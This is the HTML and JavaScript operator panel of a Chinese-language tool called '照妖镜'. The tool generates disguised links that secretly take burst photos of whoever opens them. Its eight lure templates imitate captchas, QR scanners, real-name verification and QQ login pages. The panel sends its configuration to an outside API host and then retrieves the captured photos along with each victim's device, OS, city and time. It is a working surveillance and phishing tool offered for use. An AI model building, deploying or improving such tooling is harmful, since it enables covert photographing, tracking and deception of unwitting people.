<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>照妖镜</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            position: relative;
            padding: 20px;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 560px;
            margin: 0 auto;
        }
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 44px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .header { padding: 40px 28px 28px; text-align: center; }
        .header-icon { font-size: 48px; margin-bottom: 12px; }
        .header h1 { font-size: 32px; font-weight: 600; color: #1a1a1a; }
        .header-badge { display: inline-block; background: rgba(0,0,0,0.05); padding: 5px 14px; border-radius: 30px; font-size: 11px; color: #666; margin-top: 10px; }
        .cleanup-note { background: #e8f0fe; border-radius: 12px; padding: 10px 12px; margin-top: 12px; font-size: 11px; color: #007aff; }
        .tabs { display: flex; padding: 8px 20px 0; gap: 8px; }
        .tab-btn { flex: 1; padding: 12px; background: transparent; border: none; font-size: 15px; font-weight: 500; color: #999; cursor: pointer; border-radius: 30px; transition: all 0.2s; }
        .tab-btn.active { color: #007aff; background: rgba(0,122,255,0.1); }
        .content { padding: 24px 24px 40px; }
        .tab-pane { display: none; animation: fadeIn 0.3s; }
        .tab-pane.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .form-group { margin-bottom: 20px; }
        .form-label { font-size: 13px; font-weight: 500; color: #666; margin-bottom: 8px; display: block; }
        input, textarea, select { width: 100%; padding: 14px 16px; border: 1.5px solid #e5e5e7; border-radius: 16px; font-size: 15px; background: white; font-family: inherit; }
        select { cursor: pointer; }
        input:focus, textarea:focus, select:focus { outline: none; border-color: #007aff; box-shadow: 0 0 0 4px rgba(0,122,255,0.1); }
        textarea { resize: vertical; min-height: 80px; }
        .btn-primary { width: 100%; padding: 14px; background: #007aff; border: none; border-radius: 16px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.2s; }
        .btn-primary:hover { background: #0051d5; transform: scale(0.98); }
        .btn-secondary { width: 100%; padding: 14px; background: rgba(0,0,0,0.05); border: none; border-radius: 16px; color: #007aff; font-size: 15px; font-weight: 500; cursor: pointer; }
        .result-card { margin-top: 24px; background: rgba(0,0,0,0.03); border-radius: 20px; padding: 20px; }
        .link-box { background: #f5f5f7; padding: 12px; border-radius: 12px; word-break: break-all; font-size: 12px; font-family: monospace; margin-bottom: 12px; }
        .btn-copy { width: 100%; padding: 12px; background: #e5e5ea; border: none; border-radius: 12px; color: #007aff; cursor: pointer; }
        .tip-card { margin-top: 20px; background: rgba(0,0,0,0.03); border-radius: 20px; padding: 16px; }
        .tip-title { font-size: 12px; font-weight: 600; color: #8e8e93; margin-bottom: 12px; }
        .tip-list li { font-size: 12px; color: #666; padding: 5px 0; display: flex; align-items: center; gap: 8px; }
        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 12px; margin-top: 16px; }
        .photo-card { background: white; border-radius: 16px; overflow: hidden; cursor: pointer; transition: all 0.2s; position: relative; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
        .photo-card:hover { transform: translateY(-2px); }
        .photo-card img { width: 100%; height: 120px; object-fit: cover; }
        .photo-info { padding: 10px; }
        .photo-time { font-size: 10px; color: #8e8e93; margin-bottom: 4px; }
        .photo-device { font-size: 10px; font-weight: 500; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
        .delete-photo { position: absolute; top: 8px; right: 8px; background: rgba(0,0,0,0.6); border: none; color: white; width: 28px; height: 28px; border-radius: 28px; cursor: pointer; font-size: 12px; backdrop-filter: blur(4px); z-index: 10; transition: all 0.2s; }
        .delete-photo:hover { background: #ff3b30; transform: scale(0.95); }
        .location-badge { background: #e8f0fe; color: #007aff; padding: 2px 8px; border-radius: 12px; font-size: 9px; }
        .frame-badge { background: #007aff; color: white; padding: 2px 6px; border-radius: 12px; font-size: 9px; margin-left: 4px; }
        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; }
        .modal.active { display: flex; }
        .modal-content { max-width: 90vw; max-height: 90vh; position: relative; }
        .modal-content img { max-width: 100%; max-height: 80vh; border-radius: 16px; }
        .modal-close { position: absolute; top: -40px; right: 0; background: rgba(255,255,255,0.2); border: none; color: white; width: 36px; height: 36px; border-radius: 36px; cursor: pointer; font-size: 20px; }
        .modal-info { position: absolute; bottom: -50px; left: 0; right: 0; text-align: center; color: rgba(255,255,255,0.7); font-size: 11px; }
        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: rgba(0,0,0,0.85); color: white; padding: 10px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; transition: transform 0.3s; white-space: nowrap; }
        .toast.show { transform: translateX(-50%) translateY(0); }
        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.6s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { text-align: center; margin-top: 20px; font-size: 11px; color: rgba(255,255,255,0.5); }
        .empty-state { text-align: center; padding: 40px; color: #8e8e93; }
        .empty-state i { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
        .qrcode-area { margin-top: 16px; text-align: center; padding: 12px; background: white; border-radius: 16px; }
        .qrcode-img { width: 120px; height: 120px; margin: 0 auto; }
        .qrcode-img img { width: 100%; height: 100%; border-radius: 12px; }
        .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .template-selector { display: flex; flex-wrap: wrap; gap: 8px; background: #f5f5f7; border-radius: 20px; padding: 8px; }
        .template-option { flex: 1; min-width: 70px; text-align: center; padding: 8px 6px; border-radius: 16px; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.2s; color: #666; }
        .template-option i { margin-right: 4px; font-size: 12px; }
        .template-option.active { background: white; color: #007aff; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        @media (max-width: 500px) {
            .container { padding: 0 16px; }
            .header { padding: 32px 20px 24px; }
            .header h1 { font-size: 28px; }
            .content { padding: 20px 20px 32px; }
            .photo-grid { gap: 8px; }
            .photo-card img { height: 100px; }
            .template-option { font-size: 10px; padding: 6px 4px; min-width: 60px; }
        }
        .api-url-input {
            font-size: 12px;
            color: #8e8e93;
            background: #f5f5f7;
            padding: 8px 12px;
            border-radius: 10px;
            margin-bottom: 16px;
            word-break: break-all;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <div class="header-icon">🪞</div>
            <h1>照妖镜</h1>
            <div class="header-badge">8种伪装模板 · 40分钟有效</div>
            <div class="cleanup-note"><i class="fas fa-clock"></i> 每编号40分钟自动销毁 · <i class="fas fa-envelope"></i> 邮件通知 · <i class="fas fa-ban"></i> 编号不可重复</div>
            <div class="api-url-input"><i class="fas fa-server"></i> API: http://a1nb66.atwebpages.com/zyj/api.php</div>
        </div>
        <div class="tabs">
            <button class="tab-btn active" data-tab="create">✨ 生成</button>
            <button class="tab-btn" data-tab="view">📸 相册</button>
        </div>
        <div class="content">
            <div id="create" class="tab-pane active">
                <div class="form-group"><label class="form-label">🔑 编号</label><input type="text" id="create-code" placeholder="例如: xiaohua"></div>
                <div class="row-2">
                    <div class="form-group"><label class="form-label">📸 连拍数量</label><select id="burst-count"><option value="1">1 张</option><option value="2">2 张</option><option value="3" selected>3 张</option><option value="4">4 张</option><option value="5">5 张</option></select></div>
                    <div class="form-group"><label class="form-label">🎭 伪装模板</label>
                        <div class="template-selector" id="templateSelector">
                            <div class="template-option active" data-template="loading"><i class="fas fa-spinner"></i> 加载</div>
                            <div class="template-option" data-template="scanner"><i class="fas fa-qrcode"></i> 扫码</div>
                            <div class="template-option" data-template="captcha"><i class="fas fa-shield"></i> 验证码</div>
                            <div class="template-option" data-template="slider"><i class="fas fa-arrows-alt-h"></i> 滑块</div>
                            <div class="template-option" data-template="puzzle"><i class="fas fa-puzzle-piece"></i> 拼图</div>
                            <div class="template-option" data-template="auth"><i class="fas fa-id-card"></i> 实名</div>
                            <div class="template-option" data-template="game"><i class="fab fa-qq"></i> QQ登录</div>
                            <div class="template-option" data-template="task"><i class="fas fa-coins"></i> 赏帮赚</div>
                        </div>
                    </div>
                </div>
                <div class="form-group"><label class="form-label">🔗 跳转地址</label><textarea id="redirect-url" placeholder="https://example.com" style="min-height: 70px;"></textarea></div>
                <button id="gen-link-btn" class="btn-primary">✨ 生成链接</button>
                <div id="result-area" style="display: none;">
                    <div class="result-card">
                        <div class="link-box" id="share-link"></div>
                        <button id="copy-link-btn" class="btn-copy">📋 复制链接</button>
                        <div id="qrcode-area" class="qrcode-area" style="display: none;"><div class="qrcode-img" id="qrcode-img"></div></div>
                    </div>
                    <div class="tip-card">
                        <div class="tip-title">📖 说明</div>
                        <ul class="tip-list">
                            <li>📸 自动连拍 <span id="burst-value-tip">3</span> 张照片</li>
                            <li>🎭 <span id="template-name-tip">加载中</span> 伪装模板</li>
                            <li>⏰ 每个链接有效期40分钟，过期自动销毁</li>
                            <li>🚫 每个编号只能使用一次，不可重复</li>
                        </ul>
                    </div>
                </div>
            </div>
            <div id="view" class="tab-pane">
                <div class="form-group"><label class="form-label">🔍 编号</label><input type="text" id="view-code" placeholder="例如: xiaohua"></div>
                <button id="view-btn" class="btn-secondary">🔍 查看照片</button>
                <div id="view-result" style="margin-top: 20px;"></div>
            </div>
        </div>
    </div>
    <div class="footer">8种伪装模板 · 40分钟自动销毁 · 编号不可重复</div>
</div>
<div id="image-modal" class="modal"><div class="modal-content"><button class="modal-close" onclick="closeModal()">✕</button><img id="modal-image" src=""><div class="modal-info" id="modal-info"></div></div></div>

<script>
// API地址
const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';

// ============================================================
// DOM元素
// ============================================================
const tabBtns = document.querySelectorAll('.tab-btn');
const panes = document.querySelectorAll('.tab-pane');
const createCode = document.getElementById('create-code');
const redirectUrl = document.getElementById('redirect-url');
const burstCountSelect = document.getElementById('burst-count');
const genBtn = document.getElementById('gen-link-btn');
const resultArea = document.getElementById('result-area');
const shareLinkSpan = document.getElementById('share-link');
const copyBtn = document.getElementById('copy-link-btn');
const viewCode = document.getElementById('view-code');
const viewBtn = document.getElementById('view-btn');
const viewResult = document.getElementById('view-result');
const qrcodeArea = document.getElementById('qrcode-area');
const qrcodeImg = document.getElementById('qrcode-img');
const burstValueTip = document.getElementById('burst-value-tip');
const templateNameTip = document.getElementById('template-name-tip');

let currentViewCode = '';
let selectedTemplate = 'loading';

const templateOptions = document.querySelectorAll('.template-option');
const templateNames = {'loading':'加载中','scanner':'扫一扫','captcha':'验证码','slider':'滑块验证','puzzle':'拼图验证','auth':'实名认证','game':'QQ登录','task':'赏帮赚'};

templateOptions.forEach(opt => {
    opt.addEventListener('click', () => {
        templateOptions.forEach(o => o.classList.remove('active'));
        opt.classList.add('active');
        selectedTemplate = opt.getAttribute('data-template');
        templateNameTip.textContent = templateNames[selectedTemplate] || selectedTemplate;
    });
});

function updateBurstDisplay() { burstValueTip.textContent = burstCountSelect.value; }
burstCountSelect.addEventListener('change', updateBurstDisplay);
updateBurstDisplay();

// Toast提示
function showToast(msg, isError = false) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.style.background = isError ? '#ff4444' : 'rgba(0,0,0,0.85)';
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.classList.add('show'), 10);
    setTimeout(() => toast.remove(), 2500);
}

// 复制
async function copyToClipboard(text) {
    try {
        await navigator.clipboard.writeText(text);
        return true;
    } catch(e) {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.cssText = 'position:fixed;top:-9999px';
        document.body.appendChild(ta);
        ta.select();
        const success = document.execCommand('copy');
        document.body.removeChild(ta);
        return success;
    }
}

// 生成二维码
async function generateQRCode(url) {
    qrcodeImg.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(url)}">`;
    qrcodeArea.style.display = 'block';
}

// 打开大图
function openModal(imgUrl, metadata) {
    const modal = document.getElementById('image-modal');
    const modalImg = document.getElementById('modal-image');
    const modalInfo = document.getElementById('modal-info');
    modalImg.src = imgUrl;
    let html = '';
    if (metadata) {
        if (metadata.frame) html += `第 ${metadata.frame} 张<br>`;
        if (metadata.device) html += `${metadata.device.device} · ${metadata.device.os}<br>`;
        if (metadata.location && metadata.location.city !== 'Unknown') html += `📍 ${metadata.location.city}<br>`;
        html += `📅 ${metadata.time}`;
    }
    modalInfo.innerHTML = html;
    modal.classList.add('active');
}

function closeModal() {
    document.getElementById('image-modal').classList.remove('active');
}

// 删除照片
async function deletePhoto(photoName, code) {
    if (!confirm('确定删除？')) return;
    try {
        const resp = await fetch(`${API_URL}?action=delete_photo&code=${encodeURIComponent(code)}&photo=${encodeURIComponent(photoName)}`);
        const result = await resp.json();
        if (result.success) {
            showToast('已删除');
            loadPhotos(currentViewCode);
        } else {
            showToast('删除失败', true);
        }
    } catch(e) {
        showToast('删除失败', true);
    }
}

// 加载照片
async function loadPhotos(code) {
    currentViewCode = code;
    viewResult.innerHTML = '<div style="text-align:center; padding: 40px;"><span class="loading-spinner"></span> 加载中</div>';
    try {
        const resp = await fetch(`${API_URL}?action=view&code=${encodeURIComponent(code)}`);
        const data = await resp.json();
        if (data.images && data.images.length > 0) {
            let html = '<div class="photo-grid">';
            for (let item of data.images) {
                const meta = item.metadata;
                const locationText = meta?.location?.city !== 'Unknown' ? `<span class="location-badge">📍 ${meta.location.city}</span>` : '';
                const frameText = meta?.frame ? `<span class="frame-badge">第${meta.frame}张</span>` : '';
                html += `
                    <div class="photo-card">
                        <button class="delete-photo" onclick="event.stopPropagation(); deletePhoto('${item.name}','${code}')"><i class="fas fa-trash"></i></button>
                        <img src="${item.url}?t=${Date.now()}" loading="lazy" onclick='openModal("${item.url}", ${JSON.stringify(meta||{}).replace(/'/g,"\\'")})'>
                        <div class="photo-info">
                            <div class="photo-time">${meta?.time?.substring(5,16)||''}</div>
                            <div class="photo-device">${meta?.device?.os||''} ${frameText} ${locationText}</div>
                        </div>
                    </div>
                `;
            }
            html += `</div>`;
            viewResult.innerHTML = html;
        } else {
            viewResult.innerHTML = `<div class="empty-state"><i class="fas fa-camera"></i><p>暂无照片</p><p style="font-size:11px;color:#999;">链接可能已超过40分钟有效期</p></div>`;
        }
    } catch(e) {
        viewResult.innerHTML = `<div class="empty-state"><i class="fas fa-exclamation"></i><p>加载失败</p></div>`;
    }
}

// Tab切换
tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const tabId = btn.getAttribute('data-tab');
        tabBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        panes.forEach(p => p.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
    });
});

// 保存配置
async function saveConfig(code, url, burstCount, template) {
    await fetch(`${API_URL}?action=save_config&code=${encodeURIComponent(code)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ redirect: url, burst_count: burstCount, template: template })
    });
}

// 生成链接
genBtn.addEventListener('click', async () => {
    let code = createCode.value.trim();
    if (!code) { showToast('请输入编号', true); return; }
    code = code.replace(/[^a-zA-Z0-9_]/g, '');
    if (!code) { showToast('编号只能包含字母、数字和下划线', true); return; }
    let url = redirectUrl.value.trim();
    if (!url) { showToast('请填写跳转地址', true); return; }
    if (!url.startsWith('http')) url = 'https://' + url;

    const burstCount = parseInt(burstCountSelect.value);
    const template = selectedTemplate;
    const templateName = templateNames[template] || template;

    genBtn.disabled = true;
    const originalText = genBtn.innerHTML;
    genBtn.innerHTML = '<span class="loading-spinner"></span> 检测中...';

    try {
        const checkRes = await fetch(`${API_URL}?action=check_code&code=${encodeURIComponent(code)}`);
        const checkData = await checkRes.json();
        if (checkData.exists) {
            showToast('编号已存在或未过期，请使用其他编号', true);
            genBtn.disabled = false;
            genBtn.innerHTML = originalText;
            return;
        }
    } catch(e) { console.warn(e); }

    genBtn.innerHTML = '<span class="loading-spinner"></span> 生成中';
    await saveConfig(code, url, burstCount, template);
    const shareUrl = window.location.href.split('?')[0] + '?action=photo&code=' + encodeURIComponent(code);
    shareLinkSpan.innerText = shareUrl;
    resultArea.style.display = 'block';
    await generateQRCode(shareUrl);
    sessionStorage.setItem('lastCode', code);
    genBtn.innerHTML = originalText;
    genBtn.disabled = false;
    showToast(`链接已生成 (40分钟有效，${templateName}模板，连拍${burstCount}张)`);
});

// 复制链接
copyBtn.addEventListener('click', async () => {
    const link = shareLinkSpan.innerText;
    const ok = await copyToClipboard(link);
    showToast(ok ? '已复制' : '复制失败', !ok);
});

// 查看照片
viewBtn.addEventListener('click', async () => {
    let code = viewCode.value.trim();
    if (!code) { showToast('请输入编号', true); return; }
    code = code.replace(/[^a-zA-Z0-9_]/g, '');
    loadPhotos(code);
});

// 大图模态框关闭
document.getElementById('image-modal').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
});

// 恢复上次编号
const lastCode = sessionStorage.getItem('lastCode');
if (lastCode) createCode.value = lastCode;
if (!lastCode) createCode.value = 'user_' + Math.random().toString(36).substr(2, 6);
</script>
</body>
</html>
